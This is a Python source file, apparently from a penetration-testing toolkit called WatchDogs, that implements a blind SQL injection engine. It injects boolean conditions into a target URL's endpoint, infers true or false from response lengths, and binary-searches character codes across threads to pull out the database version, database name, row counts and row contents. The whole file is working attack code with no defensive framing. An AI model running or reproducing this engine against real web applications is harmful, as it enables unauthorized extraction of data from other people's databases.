# author: WatchDogOblivion
# description: TODO
# WatchDogs Blind SQL Request Response Service
# pylint: disable=R0904

import time
import copy

from typing import Callable  # pylint: disable=unused-import
from collections import OrderedDict
from multiprocessing.pool import ThreadPool
from pathos.multiprocessing import ProcessingPool

from watchdogs.base.models import AllArgs # pylint: disable=unused-import
from watchdogs.utils import GeneralUtility
from watchdogs.web.models import BlindSQLRRHelper  # pylint: disable=unused-import
from watchdogs.web.models.Requests import Request  # pylint: disable=unused-import
from watchdogs.web.parsers import BlindSQLArgs
from watchdogs.web.services import RequestResponseService
from watchdogs.utils.Constants import (COUNT, LENGTH, NAME, VALUE, VERSION)
from watchdogs.web.webutils.BlindSQLRRQueries import CIPH, ODPH, ORPH, RIPH, BlindSQLRRQueries

KEY_MAP = OrderedDict([(VERSION, '@@version'), (NAME, 'database()')])
OPERAND_LIMIT = 10000
ERROR = -999
ERROR_STRING = '-999'
EXCEED_MSG = "Exceeded maximum operand limit."


class BlindSQLRRService(RequestResponseService):

  @staticmethod
  def resetEndpoint(request, originalEndpoint):
    # type: (Request, str) -> None
    requestInfo = request.getRequestInfo()
    requestInfo.setEndpoint(originalEndpoint)
    request.setRequestInfo(requestInfo)
    return request

  @staticmethod
  def updateEndpoint(request, query):
    # type: (Request, str) -> Request
    requestInfo = request.getRequestInfo()
    requestInfo.setEndpoint(requestInfo.getEndpoint() + query)
    request.setRequestInfo(requestInfo)
    return request

  @staticmethod
  def getMultiprocessingArgs(allArgs, request, helper, argumentSize, startIndex=0):
    # type: (AllArgs, Request, BlindSQLRRHelper, int, int) -> tuple
    allArgsArray = []
    requestArray = []
    helperArray = []
    index = 0

    while index < argumentSize:
      allArgsArray.append(allArgs)
      requestArray.append(request)
      helperArray.append(helper)
      index += 1
    return (allArgsArray, requestArray, helperArray, range(startIndex, argumentSize))

  @staticmethod
  def multithread(method, allArgs, request, helper, processes):
    # type: (Callable, AllArgs, Request, BlindSQLRRHelper, int) -> str
    jobs = []
    results = []
    pool = ThreadPool(processes=processes)

    for index in range(processes):
      jobs.append(pool.apply_async(method, (allArgs, request, copy.deepcopy(helper), index)))

    for job in jobs:
      try:
        results.append(job.get())
      except Exception as e:
        results.append(e)

    return results

  def multiprocess(self, method, allArgs, request, helper, argumentSize, startIndex=0):
    # type: (Callable, AllArgs, Request, BlindSQLRRHelper, int, int) -> str
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    pool = ProcessingPool(blindSQLArgs.processPoolSize)
    args = self.getMultiprocessingArgs(allArgs, request, helper, argumentSize, startIndex)
    return pool.map(method, *args)

  def getDbCharacterInteger(self, allArgs, request, helper, index):
    # type: (AllArgs, Request, BlindSQLRRHelper, int) -> int
    helper.setCharacterIndex(index)
    helper.setQueryOperand(0)
    integerValue = self.operandBinarySearch(allArgs, request, helper)
    return integerValue

  def getDatabaseValue(self, allArgs, request, helper, dbValueLength):
    # type: (AllArgs, Request, BlindSQLRRHelper, int) -> str

    dbCharacterIntegers = self.multiprocess(self.getDbCharacterInteger, allArgs, request, helper,
                                            dbValueLength)
    if (ERROR in dbCharacterIntegers):
      return ERROR_STRING

    nullByteCount = 0
    databaseValue = ""

    for characterInteger in dbCharacterIntegers:
      if (characterInteger == 0):
        nullByteCount += 1
      characterValue = chr(characterInteger)
      databaseValue += characterValue

    if (nullByteCount > 0):
      remainingCharacterIntegers = self.multiprocess(self.getDbCharacterInteger, allArgs, request, helper,
                                                     nullByteCount + dbValueLength, dbValueLength)

      for characterInteger in remainingCharacterIntegers:
        characterValue = chr(characterInteger)
        databaseValue += characterValue

    return databaseValue

  def getRowValue(self, allArgs, request, helper, index):
    # type: (AllArgs, Request, BlindSQLRRHelper, int) -> str
    helper.setRowIndex(index)
    helper.setQueryOperand(0)
    helper.setIsRowCheck(True)
    BlindSQLRRQueries.setQuery(LENGTH, allArgs, helper)

    valueLength = self.operandBinarySearch(allArgs, request, helper)
    if (valueLength == ERROR):
      return ERROR_STRING
    helper.setIsRowCharacterCheck(True)
    BlindSQLRRQueries.setQuery(VALUE, allArgs, helper)

    return self.getDatabaseValue(allArgs, request, helper, valueLength)

  def getInvalidResponseLength(self, allArgs, request):
    # type: (AllArgs, Request) -> int
    blindSQLArgs = allArgs.getArgs(BlindSQLArgs)
    query = "{0}{1}AND{1}1=2{2}"
    query = query.format(blindSQLArgs.terminator, blindSQLArgs.wordDelimiter, blindSQLArgs.commentOut)
    query = GeneralUtility.urlEncode(query)

    response = self.sendRequest(allArgs, self.updateEndpoint(request, query))
    return int(self.getFinalResponse(response).getResponseLength())

  def operatorOperand(self, allArgs, request, helper):
    # type: (AllArgs, Request, BlindSQLRRHelper) -> bool
    self.resetEndpoint(request, helper.getOriginalEndpoint())

    query = helper.getQuery()
    replaced = query.replace(ORPH, helper.getQueryOperator())
    replaced = replaced.replace(ODPH, str(helper.getQueryOperand()))

    if (helper.isCharacterCheck() or helper.isRowCharacterCheck()):
      replaced = replaced.replace(CIPH, str(helper.getCharacterIndex()))

    if (helper.isRowCheck() or helper.isRowCharacterCheck()):
      replaced = replaced.replace(RIPH, str(helper.getRowIndex()))

    query = GeneralUtility.urlEncode(replaced)
    response = self.sendRequest(allArgs, self.updateEndpoint(request, query))
    responseLength = self.getFinalResponse(response).getResponseLength()

    if (int(responseLength) == helper.getInvalidResponseLength()):
      return False

    return True

  def equalsOperand(self, allArgs, request, helper):
    # type: (AllArgs, Request, BlindSQLRRHelper) -> bool
    helper.setQueryOperator("=")
    return self.operatorOperand(allArgs, request, helper)

  def isLessThanOperand(self, allArgs, request, helper):
    # type: (AllArgs, Request, BlindSQLRRHelper) -> bool
    helper.setQueryOperator("<")
    return self.operatorOperand(allArgs, request, helper)

  def operandBinarySearch(self, allArgs, request, helper):
    #type:(AllArgs, Request, BlindSQLRRHelper)->int
    operand = helper.getQueryOperand()
    if (self.equalsOperand(allArgs, request, helper)):
      return operand
    index = 0
    while (True):
      if (helper.getQueryOperand() > OPERAND_LIMIT):
        return ERROR
      helper.setQueryOperand(2**index + operand)
      if (self.isLessThanOperand(allArgs, request, helper)):
        helper.setQueryOperand(2**(index - 1) + operand)
        return self.operandBinarySearch(allArgs, request, helper)
      index += 1

  def getKeyValue(self, key, allArgs, request, helper):
    # type: (str, AllArgs, Request, BlindSQLRRHelper) -> str
    if (key == VERSION):
      helper.setQueryKey(KEY_MAP[VERSION])
    elif (key == NAME):
      helper.setQueryKey(KEY_MAP[NAME])
    else:
      helper.setQueryKey(key)

    helper.setQueryOperand(0)
    helper.setQuery(BlindSQLRRQueries.getLengthQuery(allArgs, helper))
    valueLength = self.operandBinarySearch(allArgs, request, helper)

    if (valueLength == ERROR):
      return ERROR_STRING
    helper.setIsCharacterCheck(True)
    helper.setQuery(BlindSQLRRQueries.getValueQuery(allArgs, helper))
    return self.getDatabaseValue(allArgs, request, helper, valueLength)

  def setDataBaseVersion(self, allArgs, request, helper):
    # type: (AllArgs, Request, BlindSQLRRHelper) -> None
    startTime = time.time()
    if (not helper.getDatabaseVersion()):
      databaseVersion = self.getKeyValue(VERSION, allArgs, request, helper)
      if (databaseVersion == ERROR_STRING):
        print(EXCEED_MSG)
      helper.setDatabaseVersion(databaseVersion)
    endTime = time.time()
    GeneralUtility.printTime(startTime, endTime)

  def setCurrentDatabase(self, allArgs, request, helper):
    # type: (AllArgs, Request, BlindSQLRRHelper) -> None
    startTime = time.time()
    if (not helper.getDatabaseName()):
      databaseName = self.getKeyValue(NAME, allArgs, request, helper)
      if (databaseName == ERROR_STRING):
        print(EXCEED_MSG)
      helper.setDatabaseName(databaseName)
    endTime = time.time()
    GeneralUtility.printTime(startTime, endTime)

  def setDataList(self, allArgs, request, helper):
    # type: (AllArgs, Request, BlindSQLRRHelper) -> None
    startTime = time.time()

    helper.setQueryOperand(0)
    BlindSQLRRQueries.setQuery(COUNT, allArgs, helper)
    valueCount = self.operandBinarySearch(allArgs, request, helper)

    if (valueCount < 1):
      print("There were no entries in the database for your request")
      helper.setDataList([])
    results = self.multithread(self.getRowValue, allArgs, request, helper, valueCount)
    if (ERROR_STRING in results):
      print(EXCEED_MSG)

    endTime = time.time()
    GeneralUtility.printTime(startTime, endTime)
    helper.setDataList(results)
